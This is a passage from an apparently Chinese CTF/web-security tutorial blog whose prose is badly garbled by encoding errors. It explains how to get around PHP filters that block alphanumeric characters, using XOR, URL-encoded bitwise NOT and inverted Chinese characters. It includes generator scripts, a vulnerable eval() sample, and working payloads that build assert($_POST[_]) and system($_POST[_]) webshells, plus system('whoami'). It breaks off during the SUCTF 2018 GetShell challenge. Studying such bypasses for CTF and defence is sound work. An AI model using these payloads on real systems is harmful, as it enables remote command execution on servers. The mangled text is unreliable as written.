class="comment">90è½¬ä¸ºäºŒè¿›åˆ¶ï¼š1100010</span></span><br><span class="line"><span class="comment">(3)</span></span><br><span class="line"><span class="comment">äºŒè¿›åˆ¶å¼‚æˆ–ç»“æœï¼š1010011</span></span><br><span class="line"><span class="comment">äºŒè¿›åˆ¶è½¬ä¸ºASCII: 83</span></span><br><span class="line"><span class="comment">ASCIIè½¬ä¸ºå­—ç¬¦ä¸²ï¼šS</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>phpå¼‚æˆ–è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$num</span>=<span class="number">0</span>;<span class="variable">$num</span>&lt;=<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>);<span class="variable">$num</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">33</span>;<span class="variable">$x</span>&lt;=<span class="number">126</span>;<span class="variable">$x</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$y</span>=<span class="number">33</span>;<span class="variable">$y</span>&lt;=<span class="number">126</span>;<span class="variable">$y</span>++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">judge</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>)))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="variable">$f</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>)^<span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$f</span> == <span class="variable">$shell</span>[<span class="variable">$num</span>])</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="variable">$result1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$x</span>);</span><br><span class="line">                        <span class="variable">$result2</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$y</span>);</span><br><span class="line">                        <span class="keyword">break</span> <span class="number">2</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;å¼‚æˆ–&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result2</span>;</span><br></pre></td></tr></table></figure><p>pythonå¼‚æˆ–è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">command</span>):</span><br><span class="line">    code = <span class="string">&quot;~`!@#$%&amp;*()-=+_[]&#123;&#125;;:&lt;&gt;,.?/|&quot;</span></span><br><span class="line">    result_1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    result_2 = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> command:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> command.isalpha():</span><br><span class="line">            result_1 += x</span><br><span class="line">            result_2 += x</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> code:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">in</span> code:</span><br><span class="line">                result_1 += y</span><br><span class="line">                result_2 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;(&quot;<span class="subst">&#123;result_1&#125;</span>&quot; ^ &quot;<span class="subst">&#123;result_2&#125;</span>&quot;)&#x27;</span> </span><br><span class="line"></span><br><span class="line">a=encode(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo =&gt; &quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;;$_();</span><br></pre></td></tr></table></figure><p>å› ä¸º+ä¼šè¢«è½¬æˆç©ºæ ¼ï¼Œæ‰€ä»¥éœ€è¦urlç¼–ç ä¸€ä¸‹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081704849.png" alt="image-20221008170400767"></p><h2 id="urlå–å"><a href="#urlå–å" class="headerlink" title="urlå–å"></a>urlå–å</h2><p>åŸç†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦ä¸² =&gt; ASCIIç  =&gt; äºŒè¿›åˆ¶æ•°æ® =&gt; å–å =&gt; ASCIIç  =&gt; å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><p><strong>æµ‹è¯•</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="comment">//output: %8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081707338.png" alt="image-20221008170757263"></p><p><strong>ä¸€ä¸ªå°ä¾‹å­</strong></p><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>å¼‚æˆ–</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>; <span class="comment">//assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>; <span class="comment">//_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; </span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); <span class="comment">//assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081719022.png" alt="image-20221008171907941"></p><p>åœ¨æœ‰system()ç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ç›´æ¥åˆ©ç”¨ï¼Œæ— éœ€è€ƒè™‘phpç‰ˆæœ¬å»æ„é€ assertï¼Œä¸ºè‡ªå·±æ‰¾éº»çƒ¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;(&quot;((%-&#x27;</span>^<span class="string">&#x27;[[[\@@&#x27;</span>; <span class="comment">//system</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;((/!-)&#x27;</span>^<span class="string">&#x27;_@@@@@&#x27;</span>; <span class="comment">//whoami</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$__</span>); <span class="comment">//system(&#x27;whoami&#x27;)</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081730431.png" alt="image-20221008173013379"></p><p><strong>urlå–å</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>E%<span class="number">92</span>%<span class="number">96</span>);  <span class="comment">//system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æ­¤æ—¶phpç‰ˆæœ¬&gt;7</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210081732606.png" alt="image-20221008173211563"></p><h2 id="æ±‰å­—å–å"><a href="#æ±‰å­—å–å" class="headerlink" title="æ±‰å­—å–å"></a>æ±‰å­—å–å</h2><p>æ€è·¯æ—¶åˆ©ç”¨UTF-8ç¼–ç çš„æŸä¸ªæ±‰å­—ï¼Œå¹¶å°†å…¶ä¸­æŸä¸ªå­—ç¬¦å–å‡ºæ¥ï¼Œè¿›è¡Œå–åæ“ä½œåè·å¾—ç›¸åº”å­—ç¬¦</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;æ˜¯å¤œé™æ‚„æ‚„ä¸‡ç‰©æ— å£°é£æ·¡æ·¡çš„å¹æ¥å¸¦ç€ä¸€ä¸çš„å‡‰æ„å¤çš„ç‚çƒ­åœ¨å¤œæ™šæ¶ˆå¤±æ— è¸ªä»°æœ›å¤©ç©ºå¤©è¾¹å‡ é¢—æ˜Ÿå­ç‚¹ç¼€ç€å¤œå¹•è„šä¸‹æ¯å¤©èµ°ç€çš„å°è·¯åœ¨ä»Šå¤©çŠ¹ç‹¬çš„å¯‚é™å¯‚é™å¾—ç¾ä¸½å–œæ¬¢è¿™æ ·çš„å¤œæ™šæœˆå…‰å¦‚æ°´èˆ¬çš„æµæ³»å½“å–§åš£éšå…¥é™å¯‚çµåŠ¨çš„æ¸…é£ç‰µå¼•å€¦æ€ çš„å¿ƒæµè¿åœ¨æ¨æŸ³å²¸è¾¹é£˜é£å¦‚é£é£æ‰¬æ…¢æ…¢åœ°èµ°è¡Œèµ°åœ¨ä»å®¹çš„å¤œè‰²é‡Œå››å¤„å¼¥æ¼«ç€æ°´èˆ¬çš„æ¸…æ¾ˆä¸åä¸½ä¸æ–‘æ–“å´è®©äººæ„Ÿåˆ°è¶…ç„¶è¿·ç¦»è€Œå¦©åªšé£ä¸­ä¾ç„¶æœ‰æ·¡æ·¡çš„èŠ±é¦™é‚£æ˜¯å­£èŠ‚ç•™ä¸‹çš„ç—•è¿¹æœˆè‰²é‡Œæ ‘å½±å©†å¨‘æš–æš–çš„é£æ‘‡åŠ¨ç€èŠ±æ ‘æ™ƒåŠ¨ç€é»˜å¥‘çš„é¦™æ¸…é›…è€Œæœ¦èƒ§åœ¨æœˆå¤œé‡Œé£æƒ…æ— é™å¤œè‰²æ¾„æ˜é£æ¸…æœˆæœ—æ—–æ—æˆæ°´å¢¨äº‘ç ´æœˆæ¥èŠ±å¼„å½±é£ä¸å®šäººåˆé™æ˜æœˆçº¢åº”æ»¡å¾„æˆ‘ä½åŸç€ä¸çŸ¥ä»é‚£çœ‹æ¥çš„è¯—å¥é™é™çš„æ„Ÿå—æœˆä¸‹æ‚„ç„¶ç»½æ”¾çš„é‚£ä»½æ¸…é›…å‡çœ¸çœ‹æ»¡å¤©æ˜Ÿè¾°ç¢æˆç‚¹ç‚¹çš„æ–‘é©³è½å…¥è¿œå¤„é‚£ä¸ªå°å°çš„è²å¡˜æ˜ ç€ç‚¹ç‚¹çš„æ°´çº¯å‡€è€Œæ‚ é—²ç»†ç¢çš„æœˆå…‰æ´’ä¸‹ä¸€ç»ƒé“¶ç™½æ˜ åœ¨èŠ±é—´åŒ–ä½œæ™¶è¹çš„éœ²æ–‘é©³ç¾ä¸½æˆ‘æ²‰é†‰æ²‰é†‰äºé‚£ä»½ç¼¥ç¼ˆçš„é›…è‡´æ·¡æ·¡è½»ç›ˆä»¿è‹¥çƒŸé›¨çš„å¹½é™ç©ºçµè€Œæ‚ è¿œå¤œå·²æ·±è·¯å¹½æƒ…æ›´æµ“æˆ‘çœ·æ‹çš„çœ‹å‘æ˜æœˆé‚£é‡Œä¸€æœµäº‘çµ®è½»çº±èˆ¬çš„é£˜è¿‡æ‚„æ©äº†æœˆçš„ç¾æ¶©ä¸€æŠ¹å«£ç„¶è½»è½»ç›ˆç›ˆçš„èˆ’å±•é£æŸ”æœˆåœ†å¤œè‰²æ­£é˜‘çŠä»»å‡­æœˆè‰²æ´’è½ç›¸æ€æ»¡åœ°æœˆè‰²é‡Œè®°å¿†ä»¿ä½›ä¹Ÿå˜å¾—é€æ˜åœ¨å¾®é£ä¸­èˆ’å±•ç€è‡ªç”±å¼¥æ¼«ç€æ¸©é¦¨æ¸©å©‰çš„æœˆå…‰è¦†ç›–ç€å¤œçš„æ¸…å†·æ¸…å‡‰çš„é£è‚†æ„çš„å¹è¿‡è®°å¿†çš„çª—æ¢¦ä¸­çš„ç¾ä¸½ç­‰å¾…çš„å“€æ„éƒ½æ²‰æµ¸åœ¨å¤œçš„å¹½é™ä¸­é£ä¸­è¿œè¿œçš„ä¼ æ¥ä¸€å£°å¹æ¯é‚£æ˜¯æ˜æœˆæŠŠè—åœ¨å¿ƒä¸­çš„æ•…äº‹é£˜æ‰¬æˆé£ä¸­ä¸€è‚¡æ¸…é¦™ç»†ç»†ç¢ç¢æµ…æµ…æ·¡æ·¡å€Ÿä¸€ç¼•é£çš„æƒ…æ€€é¥®ä¸€ç›æ¸…ç„¶ç¼¥ç¼ˆå’Œä¸€æ›²äººå€šå­¤æ¥¼å“ä¸€ç§æ·¡ç„¶å¿ƒæƒ…é‚£è½®æœˆä»¿ä½›ä»è¿œå¤çš„å¢¨é¦™é‡Œèµ°æ¥æ¬æ·¡è‹¥æ°´ä¼´ä¸€ç¼•ç»†é£æ‚„ç„¶æ‹¢ä¸Šé£æ‰¬çš„è¡£è§’å’Œç€æœˆéŸµæ‚ æ‚ å°†å¿ƒèå…¥é‚£ä»½æ¬æ·¡æ„Ÿå—é‚£ç§æ€¡è½»è½»çš„å°†æŸ“é¦™çš„å¿ƒäº‹æ”¾é€é™é™çš„ä»»æ€ç»ªè¿·ç¦»åœ¨æµ…å‡‰å¦‚æ¢¦çš„æœˆå¤œè¿œå¤„ä»¿ä½›ä¼ æ¥å­£èŠ‚çš„èŠ±è¯­å¿ƒä¹Ÿå¼€å§‹è†å¬ä¸€å·ä¹¦ç”»åŠç›èŒ¶é¦™ç»†ç¢çš„å½±åƒéšå¹æ¯æ”¾å…¥å¿ƒåº•çè—å‡ ç‰‡èŠ±è½ç—´é†‰äº†çƒŸé›¨æŸ“æ¹¿äº†è½»æ„é¦™æŸ“ä¸€åœ°æœˆåæµæ³„ç‚¹ç‚¹å¾®å…‰äºçª—å¤–æ‘‡æ›³æ—§æ¢¦é¥é¥åœ¨ä¹æœˆçš„å¤œé‡Œå¹è½æ¸…é¦™ä¸€ç¼•è½»è½»çš„éšé£æ½œå…¥çª—å¸·å“€å©‰çš„è‰å£°ç©¿é€æš—å¤œå”±ç€æµ…ç§‹çš„å‡„æ¸…çœ¼ç¥å¾®é»¯å‡çœ¸ä¸€å¸˜çš„å¿ƒäº‹åŒ–ä½œé£é‡Œçš„ä¸€ç¼•å¿§ä¼¤è½å¯çš„å€šç€æ¸…ç±çš„æœˆå…‰ä½è½çš„æ—¶å€™ä¸ºè‡ªå·±ç…®ä¸€å£¶æµ“æµ“çš„å’–å•¡è®©é‚£å¼¥æ¼«çš„é¦™æ°”æ¸æ¸çš„æ©ç›–æˆ‘çš„æƒ†æ€…æ”¾ä¸€æ›²å¿§ä¼¤çš„éŸ³ä¹ä»»å‡­é‚£ç¼•æ—‹å¾‹åœ¨æ— å£°æ¯é—´æ¶¦æ¹¿äº†æˆ‘çš„çœ¼ä¸€ä¸ªäººåœ¨ä¸€æ¯å’–å•¡çš„é¦™æ°”é‡Œé™é™çš„æ€€æƒ³ä½ ä¸ä¼šæ‡‚é‚£ä»½æ¸©æƒ…åœ¨æ²‰å¯‚çš„æ—¥å­é‡Œè®©æˆ‘è¿·ç¦»å¯¹ç€ç ´ç¢çš„æ—¶å…‰å¾®ç¬‘çœ‹æµå¹´é€å»çœ‹ç‚¹ç‚¹çš„æ„ç»ªä¸å¯‚å¯¥ç›¸çŸ¥ç›¸æƒœä¸€å¸˜å¿ƒäº‹åŒ–ä½œé£é‡Œçš„ä¸€ç¼•å¿§ä¼¤åœ¨æ¸©æŸ”çš„æœˆä¸‹è¿·ç¦»è€Œåˆç¼ ç»µå¾®è¹™çš„çœ‰é‡Œå©‰è½¬ç€ç›¸æ€ä¸€å¦‚æ˜¨å¤œæˆ‘åˆåœ¨é™å¤œé‡Œæ‰‹æ§æ˜Ÿå…‰å°†æ€å¿µæ”¾é£æ»¡æ€€çš„å¿ƒæ€åœ¨æ˜Ÿå¤œé‡Œç¼±ç»»æ— è¾¹æ·¡æ·¡çš„æ¸…å¹½éšé˜™é˜™çš„å“€æ„ä»å®¹çš„è½å…¥æˆ‘çš„çœ¸åº•é¡¾ç›¼ä¸­èŠ±å¼€åˆä¸€å­£ä½ çš„æ¸©æƒ…ç©¿è¿‡é¥æœ›çš„å±±æ°´ç¿©ç„¶çš„é£å…¥å°çª—é™ªæˆ‘æµ…åŸä½å”±å¦‚æ°´èˆ¬çš„è½»æŸ”ä½ çš„ç›®å…‰æ‹´ä½äº†æˆ‘çš„ç›¸æ€å°æ‰‹ç‰µä½äº†ä½ ç»™çš„æ¸©æš–ä»æ­¤å¼€å§‹å–œæ¬¢å°±è¿™æ ·å¼€å§‹æ²‰è¿·æœ¬æ˜¯é™Œè·¯å´ä¸æœŸè€Œé‡æœ¬åº”é”™è¿‡å´æ³¨å®šç›¸æƒœç›¸èšçš„æ—¥å­å¤šäº†ä¸€ä»½è´ªæ‹ç›¸ä¼´çš„æ¸©æš–è®©æˆ‘å¿˜è®°äº†æ—©å·²é¢„å®šçš„ç»ˆç‚¹æ•…äº‹æ¯•ç«Ÿæ˜¯æ•…äº‹ç»ˆç©¶æ˜¯è¦è½å¹•é‚£ä»½æˆ‘æ‰€é€‰æ‹©çš„å¹¸ç¦ä¹Ÿåªæ˜¯åœ¨æˆ‘çš„èº«è¾¹ç»•äº†ä¸€ä¸ªåœˆç„¶åèµ°è¿œæ€»æƒ³è®©è‡ªå·±å¦‚èŠ±èˆ¬å¼€åœ¨ä½ çš„çœ¼ä¸­æ€»æƒ³å°†è‡ªå·±çš„è„‰è„‰æŸ”æƒ…æ”¾åœ¨ä½ çš„æ‰‹å¿ƒä½ çš„èº«å½±å´æ€»æ˜¯åœ¨æˆ‘æ³ªçœ¼æ¨¡ç³Šæ—¶åˆæ¸æ¸é£˜è¿œé£ä¸€èˆ¬çš„ä¸ç•™ç—•è¿¹æ¯å¤©ä¸ç›¸æ€ç»“ä¼´è¡Œèµ°å“èŒ—æ—¶é‚£ä»½æ¸…é¦™ä¹Ÿä»¿å¦‚æœ‰ä½ çš„å‘³é“å¸¦æˆ‘é—²æ­¥å°åº­ç”¨ä½ çš„æŸ”æƒ…æ·¡åŒ–äº†æˆ‘çš„æ„ç»ªå½“é›¨è½è½©çª—èŠ±å¼€æ»¡å›­æˆ‘å¹»æƒ³ç€ä¸ä½ è†å¬å¸¦ç€æœŸç›¼å‡çœ¸æœ›å‘ä½ æ¥æ—¶çš„è·¯è§ä¸åˆ°ä½ çš„èº«å½±å”¯æœ‰æ—¶å…‰è¸©ç€ä¼˜é›…çš„è„šæ­¥æ¬¾æ¬¾è€Œæ¥èº«æŠ«æœˆè‰²ç‹¬ç«‹äºæ¸…å†·ä½ çš„èº«å½±é‡å äºæ—‹ç»•çš„é£ä¸­é‚£ä»½å¾®ç¬‘ä¾ç„¶ç•™åœ¨å¼¯å¼¯çš„å˜´è§’å¿ƒå´å†ä¹Ÿæ— æ³•æ·¡å®šå¦‚ç§‹æ°´æ¸…æ³ªæ»´ä¸‹æ—¶æ›¾ç»çš„è¯ºè¨€ä¸€å¦‚éš”ä¸–æŸ”æŸ”çš„æƒ…æ€æ”¾äºå¿ƒåº•é»˜é»˜åœ°æŠŠé‚£ä»½å…³åˆ‡æ•²æˆæ–‡å­—å½“æˆ‘æ— ä¾æ—¶ä½ çš„å¹½é›…ä½ çš„æ·¡ç„¶ä¾ç„¶ä¼šåœ¨æ–‡å­—é‡Œå¸¦æˆ‘çš„æ€ç»ªæ‚ ç„¶æ¢¦çš„è·¯å£æ˜¯å¦å¯ä»¥è®©å¿ƒä¾ç„¶å®ˆå€™ç­‰ä½ é£˜è€Œæ¥å†ç‰µæˆ‘çš„æ‰‹ä¸€è·¯å‰è¡Œä»Šå¤œé‚£ä»½æµ…æµ…çš„å¿§ä¼¤æ³¨å®šææµ…åœ¨æ—§æ¢¦é‡Œ&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">mb_strlen</span>(<span class="variable">$str</span>, <span class="string">&#x27;utf-8&#x27;</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$str</span>, <span class="variable">$i</span>, <span class="number">1</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    <span class="variable">$b</span> = ~(<span class="variable">$a</span>);</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$b</span>[<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$payload</span> = <span class="string">&#x27;a&#x27;</span>; <span class="comment">//å•ä¸ªå•ä¸ªå­—ç¬¦è·å–</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$c</span>==<span class="variable">$payload</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>;<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$__</span>=[];<span class="variable">$____</span>=<span class="variable">$__</span>==<span class="variable">$__</span>;</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=~(èŒ«)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(å†·)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(èŒ«)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(æ‹¥)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(æš—)[<span class="variable">$____</span>];<span class="variable">$_</span>.=~(å’Œ)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#system</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=~(æ ¼)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(å¯‚)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(æ°¸)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(æ¬¢)[<span class="variable">$____</span>];<span class="variable">$___</span>.=~(ç«Ÿ)[<span class="variable">$____</span>];</span><br><span class="line"><span class="comment">#_POST</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$$___</span>[_]);</span><br><span class="line"><span class="comment">#system($_POST[_]);</span></span><br></pre></td></tr></table></figure><p><strong>ä¸€ä¸ªå°ä¾‹é¢˜</strong></p><h3 id="SUCTF-2018-GetShell-æ— å­—æ¯getshell"><a href="#SUCTF-2018-GetShell-æ— å­—æ¯getshell" class="headerlink" title="[SUCTF 2018]GetShell(æ— å­—æ¯getshell)"></a>[SUCTF 2018]GetShell(æ— å­—æ¯getshell)</h3><p>ç»™äº†ä¸€æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$contents</span>,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$black_char</span> <span class="keyword">as</span> <span class="variable">$b</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span 